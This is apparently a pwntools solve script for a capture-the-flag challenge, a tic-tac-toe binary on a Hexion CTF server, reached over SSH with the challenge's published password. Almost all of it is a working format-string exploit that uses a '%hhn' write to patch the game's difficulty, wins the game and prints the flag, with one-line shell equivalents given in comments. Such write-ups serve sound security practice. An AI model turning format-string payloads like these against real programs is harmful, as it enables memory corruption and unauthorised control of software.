from pwn import *

context.terminal = ["tmux", "splitw", "-h"]
local = False
debug = False

r = process("./ttt") if local else ssh('ttt', 'challenges2.hexionteam.com', 3004, password="hexctf").process('./ttt')

if local and debug:
	gdb.attach(r, '''b *moveAI+69
	b *main+188''')

# PYTHON2 solution:  (python -c "print b'%204c%10\$hhnAAAA' + b'\x100\`\x00\x00\x00\x00\x00'"; cat) | ./ttt
# PYTHON3 solution: (python3 -c "print ('%204c%10\$hhnAAAA' + '\x100\`\x00\x00\x00\x00\x00')"; cat) | ./ttt

fmt = b'%204c%10$hhnAAAA' + p64(0x603010)
# DIFFICULTY:
# IMPOSSIBLE (0x401cd5) -> ret (0x401cd4)
r.sendlineafter(':', fmt)
r.send('\n')

r.send(' a a qn\n') # win [(x x x) (     ) (     )]

r.recvuntil('hex')
print(b'hex' + r.recvuntil('}'))